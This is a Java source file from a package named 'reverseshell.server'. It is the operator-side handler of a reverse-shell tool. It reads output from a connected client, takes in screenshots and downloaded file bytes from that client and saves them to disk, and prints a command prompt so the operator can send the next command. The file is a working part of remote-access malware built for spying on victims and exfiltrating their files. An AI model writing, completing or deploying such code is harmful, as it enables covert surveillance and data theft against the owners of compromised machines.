package obs1d1anc1ph3r.reverseshell.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class ResponseHandler implements Runnable {

    private final DataInputStream dataIn;
    private final DataOutputStream dataOut;
    private final Socket clientSocket;
    private final ReceiveScreenShot screenshotHandler;
    private final FileSaver fileSaver;

    public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket) {
        this.dataIn = dataIn;
        this.dataOut = dataOut;
        this.clientSocket = clientSocket;
        this.screenshotHandler = new ReceiveScreenShot();
        this.fileSaver = new FileSaver();
    }

    @Override
    public void run() {
        try {
            while (true) {
                String response = dataIn.readUTF();
                if (response == null || response.isEmpty()) {
                    System.out.println("[DEBUG] Connection closed, exiting...");
                    break;
                }

                if (response.equalsIgnoreCase("screenshot")) {
                    handleScreenshot();
                } else if (response.equalsIgnoreCase("file download")) {
                    handleFileDownload();
                } else {
                    processCommand(response);
                }
            }
        } catch (IOException e) {
            if (e instanceof java.net.SocketException) {
                System.err.println("[ERROR] Connection closed by client: " + e.getMessage());
            } else {
                System.err.println("[ERROR] Error reading response: " + e.getMessage());
            }
        } finally {
            closeResources();
            System.out.println("[*] ResponseHandler thread exiting.");
        }
    }

    private void handleScreenshot() {
        try {
            int length = dataIn.readInt();
            if (length > 0) {
                byte[] imageBytes = new byte[length];
                dataIn.readFully(imageBytes);
                screenshotHandler.receiveScreenshotData(imageBytes);
            } else {
                System.err.println("[ERROR] Invalid screenshot data length.");
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error while receiving screenshot data: " + e.getMessage());
        }
    }

    private void handleFileDownload() {
        try {
            int fileLength = dataIn.readInt();
            if (fileLength > 0) {
                byte[] fileBytes = new byte[fileLength];
                dataIn.readFully(fileBytes);
                fileSaver.saveFile(fileBytes, clientSocket);
            } else {
                System.err.println("[ERROR] Invalid file data length.");
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error while receiving file data: " + e.getMessage());
        }
    }

    private void processCommand(String response) {
        String[] lines = response.split("\\R");
        for (String line : lines) {
            System.out.println(line);
        }
        System.out.print("[-] Command> ");
    }

    private void closeResources() {
        try {
            if (dataIn != null) {
                dataIn.close();
            }
            if (dataOut != null) {
                dataOut.close();
            }
            if (clientSocket != null && !clientSocket.isClosed()) {
                clientSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
